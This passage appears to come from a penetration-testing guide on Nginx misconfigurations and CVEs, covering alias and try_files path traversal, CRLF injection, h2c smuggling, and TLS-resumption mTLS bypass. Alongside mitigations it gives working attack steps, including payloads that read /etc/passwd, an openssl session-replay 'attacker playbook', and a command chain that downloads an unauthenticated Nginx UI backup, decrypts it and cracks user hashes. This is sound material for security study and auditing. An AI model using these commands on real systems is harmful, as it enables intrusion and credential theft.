  \ id=\"missing-root-location\"></a>\n\nWhen configuring the Nginx server, the **root directive** plays a critical role by\
  \ defining the base directory from which files are served. Consider the example below:\n\n```bash\nserver {\n        root\
  \ /etc/nginx;\n\n        location /hello.txt {\n                try_files $uri $uri/ =404;\n                proxy_pass http://127.0.0.1:8080/;\n\
  \        }\n}\n```\n\nIn this configuration, `/etc/nginx` is designated as the root directory. This setup allows access\
  \ to files within the specified root directory, such as `/hello.txt`. However, it's crucial to note that only a specific\
  \ location (`/hello.txt`) is defined. There's no configuration for the root location (`location / {...}`). This omission\
  \ means that the root directive applies globally, enabling requests to the root path `/` to access files under `/etc/nginx`.\n\
  \nA critical security consideration arises from this configuration. A simple `GET` request, like `GET /nginx.conf`, could\
  \ expose sensitive information by serving the Nginx configuration file located at `/etc/nginx/nginx.conf`. Setting the root\
  \ to a less sensitive directory, like `/etc`, could mitigate this risk, yet it still may allow unintended access to other\
  \ critical files, including other configuration files, access logs, and even encrypted credentials used for HTTP basic authentication.\n\
  \n## Alias LFI Misconfiguration <a href=\"#alias-lfi-misconfiguration\" id=\"alias-lfi-misconfiguration\"></a>\n\nIn the\
  \ configuration files of Nginx, a close inspection is warranted for the \"location\" directives. A vulnerability known as\
  \ Local File Inclusion (LFI) can be inadvertently introduced through a configuration that resembles the following:\n\n```\n\
  location /imgs {\n    alias /path/images/;\n}\n```\n\nThis configuration is prone to LFI attacks due to the server interpreting\
  \ requests like `/imgs../flag.txt` as an attempt to access files outside the intended directory, effectively resolving to\
  \ `/path/images/../flag.txt`. This flaw allows attackers to retrieve files from the server's filesystem that should not\
  \ be accessible via the web.\n\nTo mitigate this vulnerability, the configuration should be adjusted to:\n\n```\nlocation\
  \ /imgs/ {\n    alias /path/images/;\n}\n```\n\nMore info: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)\n\
  \nAccunetix tests:\n\n```\nalias../ => HTTP status code 403\nalias.../ => HTTP status code 404\nalias../../ => HTTP status\
  \ code 403\nalias../../../../../../../../../../../ => HTTP status code 400\nalias../ => HTTP status code 403\n```\n\n##\
  \ Unsafe path restriction <a href=\"#unsafe-variable-use\" id=\"unsafe-variable-use\"></a>\n\nCheck the following page to\
  \ learn how to bypass directives like:\n\n```plaintext\nlocation = /admin {\n    deny all;\n}\n\nlocation = /admin/ {\n\
  \    deny all;\n}\n```\n\n\n{{#ref}}\n../../pentesting-web/proxy-waf-protections-bypass.md\n{{#endref}}\n\n## Unsafe variable\
  \ use / HTTP Request Splitting <a href=\"#unsafe-variable-use\" id=\"unsafe-variable-use\"></a>\n\n> [!CAUTION]\n> Vulnerable\
  \ variables `$uri` and `$document_ur`i and this can be fixed by replacing them with `$request_uri`.\n>\n> A regex can also\
  \ be vulnerable like:\n>\n> `location ~ /docs/([^/])? { … $1 … }` - Vulnerable\n>\n> `location ~ /docs/([^/\\s])? { … $1\
  \ … }` - Not vulnerable (checking spaces)\n>\n> `location ~ /docs/(.*)? { … $1 … }` - Not vulnerable\n\nA vulnerability\
  \ in Nginx configuration is demonstrated by the example below:\n\n```\nlocation / {\n  return 302 https://example.com$uri;\n\
  }\n```\n\nThe characters \\r (Carriage Return) and \\n (Line Feed) signify new line characters in HTTP requests, and their\
  \ URL-encoded forms are represented as `%0d%0a`. Including these characters in a request (e.g., `http://localhost/%0d%0aDetectify:%20clrf`)\
  \ to a misconfigured server results in the server issuing a new header named `Detectify`. This happens because the $uri\
  \ variable decodes the URL-encoded new line characters, leading to an unexpected header in the response:\n\n```\nHTTP/1.1\
  \ 302 Moved Temporarily\nServer: nginx/1.19.3\nContent-Type: text/html\nContent-Length: 145\nConnection: keep-alive\nLocation:\
  \ https://example.com/\nDetectify: clrf\n```\n\nLearn more about the risks of CRLF injection and response splitting at [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).\n\
  \nAlso this technique is [**explained in this talk**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77)\
  \ with some vulnerable examples and dectection mechanisms. For example, In order to detect this misconfiguration from a\
  \ blackbox perspective you could these requests:\n\n- `https://example.com/%20X` - Any HTTP code\n- `https://example.com/%20H`\
  \ - 400 Bad Request\n\nIf vulnerable, the first will return as \"X\" is any HTTP method and the second will return an error\
  \ as H is not a valid method. So the server will receive something like: `GET / H HTTP/1.1` and this will trigger the error.\n\
  \nAnother detection examples would be:\n\n- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Any HTTP code\n- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x`\
  \ - 400 Bad Request\n\nSome found vulnerable configurations presented in that talk were:\n\n- Note how **`$uri`** is set\
  \ as is in the final URL\n\n```\nlocation ^~ /lite/api/ {\n proxy_pass http://lite-backend$uri$is_args$args;\n}\n```\n\n\
  - Note how again **`$uri`** is in the URL (this time inside a parameter)\n\n```\nlocation ~ ^/dna/payment {\n rewrite ^/dna/([^/]+)\
  \ /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;\n proxy_pass http://$back;\n```\n\n- Now in AWS\
  \ S3\n\n```\nlocation /s3/ {\n proxy_pass https://company-bucket.s3.amazonaws.com$uri;\n}\n```\n\n### Any variable\n\nIt\
  \ was discovered that **user-supplied data** might be treated as an **Nginx variable** under certain circumstances. The\
  \ cause of this behavior remains somewhat elusive, yet it's not rare nor straightforward to verify. This anomaly was highlighted\
  \ in a security report on HackerOne, which can be viewed [here](https://hackerone.com/reports/370094). Further investigation\
  \ into the error message led to the identification of its occurrence within the [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365),\
  \ pinpointing Server Side Includes (SSI) as the root cause.\n\nTo **detect this misconfiguration**, the following command\
  \ can be executed, which involves setting a referer header to test for variable printing:\n\n```bash\n$ curl -H ‘Referer:\
  \ bar’ http://localhost/foo$http_referer | grep ‘foobar’\n```\n\nScans for this misconfiguration across systems revealed\
  \ multiple instances where Nginx variables could be printed by a user. However, a decrease in the number of vulnerable instances\
  \ suggests that efforts to patch this issue have been somewhat successful.\n\n### Using try_files with $URI$ARGS variables\n\
  \nFollowing Nginx misconfiguration can lead to an LFI vulnerability:\n```\nlocation / {\n\t\ttry_files $uri$args $uri$args/\
  \ /index.html;\n}\n```\nIn our configuration we have directive `try_files` which is used to check for existence of files\
  \ in specified order. Nginx will server the first one that it will find. The basic syntax of the `try_files` directive is\
  \ as follows:\n```\ntry_files file1 file2 ... fileN fallback;\n```\n\nNginx will check for the existence of each file in\
  \ the specified order. If a file exists, it will be served immediately. If none of the specified files exist, the request\
  \ will be passed to the fallback option, which can be another URI or a specific error page.\n\nHowever, when using `$uri$args`\
  \ variables in this directive, the Nginx will try to look for a file that matches the request URI combined with any query\
  \ string arguments. Therefor we can exploit this configuration:\n```\nhttp {\n\tserver {\n\t    root /var/www/html/public;\n\
  \n\t    location / {\n\t\ttry_files $uri$args $uri$args/ /index.html;\n\t    }\n\t}\n}\n```\n\nWith following payload:\n\
  ```\nGET /?../../../../../../../../etc/passwd HTTP/1.1\nHost: example.com\n```\n\nUsing our payload we will escape the root\
  \ directory (defined in Nginx configuration) and load the `/etc/passwd` file. In debug logs we can observe how the Nginx\
  \ tries the files:\n\n```\n...SNIP...\n\n2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: \"/../../../../../../../../etc/passwd\"\
  \ \"/var/www/html/public/../../../../../../../../etc/passwd\"\n2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri:\
  \ \"/../../../../../../../../etc/passwd\"\n\n...SNIP...\n\n2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: \"\
  /var/www/html/public/../../../../../../../../etc/passwd\"\n\n...SNIP...\n\n2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1\
  \ 200 OK\n\n```\n\nPoC againts Nginx using the configuration mentioned above:\n![Example burp request](../../images/nginx_try_files.png)\n\
  \n## Raw backend response reading\n\nNginx offers a feature through `proxy_pass` that allows for the interception of errors\
  \ and HTTP headers produced by the backend, aiming to hide internal error messages and headers. This is accomplished by\
  \ Nginx serving custom error pages in response to backend errors. However, challenges arise when Nginx encounters an invalid\
  \ HTTP request. Such a request gets forwarded to the backend as received, and the backend's raw response is then directly\
  \ sent to the client without Nginx's intervention.\n\nConsider an example scenario involving a uWSGI application:\n\n```python\n\
  def application(environ, start_response):\n    start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header',\
  \ 'secret-info')])\n    return [b\"Secret info, should not be visible!\"]\n```\n\nTo manage this, specific directives in\
  \ the Nginx configuration are used:\n\n```\nhttp {\n    error_page 500 /html/error.html;\n    proxy_intercept_errors on;\n\
  \    proxy_hide_header Secret-Header;\n}\n```\n\n- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors):\
  \ This directive enables Nginx to serve a custom response for backend responses with a status code greater than 300. It\
  \ ensures that, for our example uWSGI application, a `500 Error` response is intercepted and handled by Nginx.\n- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header):\
  \ As the name suggests, this directive hides specified HTTP headers from the client, enhancing privacy and security.\n\n\
  When a valid `GET` request is made, Nginx processes it normally, returning a standard error response without revealing any\
  \ secret headers. However, an invalid HTTP request bypasses this mechanism, resulting in the exposure of raw backend responses,\
  \ including secret headers and error messages.\n\n## merge_slashes set to off\n\nBy default, Nginx's **`merge_slashes` directive**\
  \ is set to **`on`**, which compresses multiple forward slashes in a URL into a single slash. This feature, while streamlining\
  \ URL processing, can inadvertently conceal vulnerabilities in applications behind Nginx, particularly those prone to local\
  \ file inclusion (LFI) attacks. Security experts **Danny Robinson and Rotem Bar** have highlighted the potential risks associated\
  \ with this default behavior, especially when Nginx acts as a reverse-proxy.\n\nTo mitigate such risks, it is recommended\
  \ to **turn the `merge_slashes` directive off** for applications susceptible to these vulnerabilities. This ensures that\
  \ Nginx forwards requests to the application without altering the URL structure, thereby not masking any underlying security\
  \ issues.\n\nFor more information check [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).\n\
  \n### **Maclicious Response Headers**\n\nAs shown in [**this writeup**](https://mizu.re/post/cors-playground), there are\
  \ certain headers that if present in the response from the web server they will change the behaviour of the Nginx proxy.\
  \ You can check them [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/):\n\n- `X-Accel-Redirect`:\
  \ Indicate Nginx to internally redirect a request to a specified location.\n- `X-Accel-Buffering`: Controls whether Nginx\
  \ should buffer the response or not.\n- `X-Accel-Charset`: Sets the character set for the response when using X-Accel-Redirect.\n\
  - `X-Accel-Expires`: Sets the expiration time for the response when using X-Accel-Redirect.\n- `X-Accel-Limit-Rate`: Limits\
  \ the rate of transfer for responses when using X-Accel-Redirect.\n\nFor example, the header **`X-Accel-Redirect`** will\
  \ cause an internal **redirect** in the nginx. So having an nginx configuration with something such as **`root /`** and\
  \ a response from the web server with **`X-Accel-Redirect: .env`** will make nginx sends the content of **`/.env`** (Path\
  \ Traversal).\n\n### **Default Value in Map Directive**\n\nIn the **Nginx configuration**, the `map` directive often plays\
  \ a role in **authorization control**. A common mistake is not specifying a **default** value, which could lead to unauthorized\
  \ access. For instance:\n\n```yaml\nhttp {\nmap $uri $mappocallow {\n/map-poc/private 0;\n/map-poc/secret 0;\n/map-poc/public\
  \ 1;\n}\n}\n```\n\n```yaml\nserver {\n    location /map-poc {\n        if ($mappocallow = 0) {return 403;}\n        return\
  \ 200 \"Hello. It is private area: $mappocallow\";\n    }\n}\n```\n\nWithout a `default`, a **malicious user** can bypass\
  \ security by accessing an **undefined URI** within `/map-poc`. [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html)\
  \ advises setting a **default value** to avoid such issues.\n\n### **DNS Spoofing Vulnerability**\n\nDNS spoofing against\
  \ Nginx is feasible under certain conditions. If an attacker knows the **DNS server** used by Nginx and can intercept its\
  \ DNS queries, they can spoof DNS records. This method, however, is ineffective if Nginx is configured to use **localhost\
  \ (127.0.0.1)** for DNS resolution. Nginx allows specifying a DNS server as follows:\n\n```yaml\nresolver 8.8.8.8;\n```\n\
  \n### **`proxy_pass` and `internal` Directives**\n\nThe **`proxy_pass`** directive is utilized for redirecting requests\
  \ to other servers, either internally or externally. The **`internal`** directive ensures that certain locations are only\
  \ accessible within Nginx. While these directives are not vulnerabilities by themselves, their configuration requires careful\
  \ examination to prevent security lapses.\n\n## proxy_set_header Upgrade & Connection\n\nIf the nginx server is configured\
  \ to pass the Upgrade and Connection headers an [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) could\
  \ be performed to access protected/internal endpoints.\n\n> [!CAUTION]\n> This vulnerability would allow an attacker to\
  \ **stablish a direct connection with the `proxy_pass` endpoint** (`http://backend:9999` in this case) that whose content\
  \ is not going to be checked by nginx.\n\nExample of vulnerable configuration to steal `/flag` from [here](https://bishopfox.com/blog/h2c-smuggling-request):\n\
  \n```\nserver {\n    listen       443 ssl;\n    server_name  localhost;\n\n    ssl_certificate       /usr/local/nginx/conf/cert.pem;\n\
  \    ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;\n\n    location / {\n     proxy_pass http://backend:9999;\n\
  \     proxy_http_version 1.1;\n     proxy_set_header Upgrade $http_upgrade;\n     proxy_set_header Connection $http_connection;\n\
  \    }\n\n    location /flag {\n     deny all;\n    }\n```\n\n> [!WARNING]\n> Note that even if the `proxy_pass` was pointing\
  \ to a specific **path** such as `http://backend:9999/socket.io` the connection will be stablished with `http://backend:9999`\
  \ so you can **contact any other path inside that internal endpoint. So it doesn't matter if a path is specified in the\
  \ URL of proxy_pass.**\n\n## HTTP/3 QUIC module remote DoS & leak (2024)\n\nDuring 2024 Nginx disclosed CVE-2024-31079,\
  \ CVE-2024-32760, CVE-2024-34161 and CVE-2024-35200 showing that a **single hostile QUIC session** can crash worker processes\
  \ or leak memory whenever the experimental `ngx_http_v3_module` is compiled in and a `listen ... quic` socket is exposed.\
  \ Impacted builds are 1.25.0–1.25.5 and 1.26.0, while 1.27.0/1.26.1 ship the fixes; the memory disclosure (CVE-2024-34161)\
  \ additionally requires MTUs larger than 4096 bytes to surface sensitive data (details in the 2024 nginx advisory referenced\
  \ below).\n\n**Recon & exploitation hints**\n\n- HTTP/3 is opt-in, so scan for `Alt-Svc: h3=\":443\"` responses or brute-force\
  \ UDP/443 QUIC handshakes; once confirmed, fuzz the handshake and STREAM frames with custom `quiche-client`/`nghttp3` payloads\
  \ to trigger worker crashes and force log leakage.\n- Quickly fingerprint target support with:\n\n```bash\nnginx -V 2>&1\
  \ | grep -i http_v3\nrg -n \"listen .*quic\" /etc/nginx/\n```\n\n## TLS session resumption bypass of client cert auth (CVE-2025-23419)\n\
  \nA February 2025 advisory disclosed that nginx 1.11.4–1.27.3 built with OpenSSL allows **reusing a TLS 1.3 session** from\
  \ one name-based virtual host inside another, so a client that negotiated a certificate-free host can replay the ticket/PSK\
  \ to jump into a vhost protected with `ssl_verify_client on;` and skip mTLS entirely. The bug triggers whenever multiple\
  \ virtual hosts share the same TLS 1.3 session cache and tickets (see the 2025 nginx advisory referenced below).\n\n**Attacker\
  \ playbook**\n\n```bash\n# 1. Create a TLS session on the public vhost and save the session ticket\nopenssl s_client -connect\
  \ public.example.com:443 -sess_out ticket.pem\n\n# 2. Replay that session ticket against the mTLS vhost before it expires\n\
  openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof\n```\n\nIf the target is vulnerable, the second\
  \ handshake completes without presenting a client certificate, revealing protected locations.\n\n**What to audit**\n\n-\
  \ Mixed `server_name` blocks that share `ssl_session_cache shared:SSL` plus `ssl_session_tickets on;`.\n- Admin/API blocks\
  \ that expect mTLS but inherit shared session cache/ticket settings from public hosts.\n- Automation that enables TLS 1.3\
  \ session resumption globally (e.g., Ansible roles) without considering vhost isolation.\n\n## HTTP/2 Rapid Reset resilience\
  \ (CVE-2023-44487 behavior)\n\nThe HTTP/2 Rapid Reset attack (CVE-2023-44487) still affects nginx when operators crank `keepalive_requests`\
  \ or `http2_max_concurrent_streams` beyond the defaults: an attacker opens one HTTP/2 connection, floods it with thousands\
  \ of streams, then immediately issues `RST_STREAM` frames so the concurrency ceiling is never reached while CPU keeps burning\
  \ on tear-down logic. Nginx defaults (128 concurrent streams, 1000 keepalive requests) keep the blast radius small; pushing\
  \ those limits \"substantially higher\" makes it trivial to starve workers even from a single client (see the F5 write-up\
  \ referenced below).\n\n**Detection tips**\n\n```bash\n# Highlight risky knobs\nrg -n \"http2_max_concurrent_streams\" /etc/nginx/\n\
  rg -n \"keepalive_requests\" /etc/nginx/\n```\n\nHosts that reveal unusually high values for those directives are prime\
  \ targets: one HTTP/2 client can loop through stream creation and instant `RST_STREAM` frames to keep CPU pegged without\
  \ tripping the concurrency cap.\n\n## Nginx UI pre-auth backup export + crypto material leakage\n\n**Nginx UI** is a separate\
  \ admin panel for nginx, not the nginx daemon itself. In **Nginx UI < 2.3.3**, the backup export endpoint may be reachable\
  \ **without authentication** and the response can also leak the **AES-256-CBC key and IV** needed to decrypt the backup\
  \ via the `X-Backup-Security` header. This turns an \"encrypted backup download\" into immediate **credential / token /\
  \ private-key disclosure**.\n\n### Fast version fingerprinting from SPA assets\n\nIf the login page is a JS-heavy SPA, pull\
  \ the main bundle from `/` and look for a dedicated version chunk:\n\n```bash\ncurl -s http://admin.example/ | grep -oP\
  \ 'assets/index-[^\"]+\\.js'\ncurl -s http://admin.example/assets/index-<hash>.js | grep -oP 'version[-\\\\w]*\\\\.js'\n\
  curl -s http://admin.example/assets/version-<hash>.js\n```\n\nOn vulnerable Nginx UI builds this often returns a literal\
  \ such as `const t=\"2.3.2\"`, which is enough to match the vulnerable range before authenticating.\n\n### Check exposed\
  \ API endpoints and pull the backup\n\nEven when most `/api/*` routes return `403`, test backup-style endpoints directly:\n\
  \n```bash\ncurl -s http://admin.example/api/install\ncurl -s -D headers.txt -o backup.zip http://admin.example/api/backup\n\
  grep -i '^X-Backup-Security:' headers.txt\nunzip -l backup.zip\n```\n\nIf vulnerable, `X-Backup-Security` contains `base64(key):base64(iv)`.\
  \ Decode both values and confirm the expected lengths (**32-byte key**, **16-byte IV**):\n\n```bash\nKEY_B64='<base64-key>';\
  \ IV_B64='<base64-iv>'\nKEY_HEX=$(printf '%s' \"$KEY_B64\" | base64 -d | xxd -p -c 0)\nIV_HEX=$(printf '%s' \"$IV_B64\"\
  \ | base64 -d | xxd -p -c 0)\nunzip backup.zip -d backup\nopenssl enc -aes-256-cbc -d -in backup/hash_info.txt -out hash_info.txt\
  \ -K \"$KEY_HEX\" -iv \"$IV_HEX\"\nopenssl enc -aes-256-cbc -d -in backup/nginx.zip -out nginx_dec.zip -K \"$KEY_HEX\" -iv\
  \ \"$IV_HEX\"\nopenssl enc -aes-256-cbc -d -in backup/nginx-ui.zip -out nginx-ui_dec.zip -K \"$KEY_HEX\" -iv \"$IV_HEX\"\
  \n```\n\nAfter decryption, inspect the recovered nginx configs and the Nginx UI application data. A common post-exploitation\
  \ path is:\n\n- Extract reverse-proxy and vhost details from `nginx_dec.zip`\n- Inspect `nginx-ui_dec.zip` for `app.ini`,\
  \ `database.db`, API tokens, or certificate material\n- Dump the SQLite `users` table and crack recovered password hashes\
  \ offline\n\n```bash\nunzip nginx-ui_dec.zip -d nginx-ui\nsqlite3 nginx-ui/database.db 'select name,password from users;'\n\
  hashcat -m 3200 hashes.txt <wordlist>\n```\n\nThis pattern is worth testing in other admin products too: **an unauthenticated\
  \ \"encrypted\" export is still plaintext disclosure if the response leaks the decryption material or stores it alongside\
  \ the archive.**\n\n## Try it yourself\n\nDetectify has created a GitHub repository where you can use Docker to set up your\
